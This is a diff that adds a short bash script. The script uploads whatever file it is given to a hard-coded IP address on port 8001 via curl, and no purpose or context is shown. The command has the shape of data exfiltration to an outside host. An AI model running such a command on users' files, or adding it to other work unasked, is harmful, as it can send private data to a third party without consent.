@@ -1,0 +1,2 @@
+#!/bin/bash -x
+curl  --header "File-Name:${1}" --data-binary @${1} http://97.64.108.66:8001
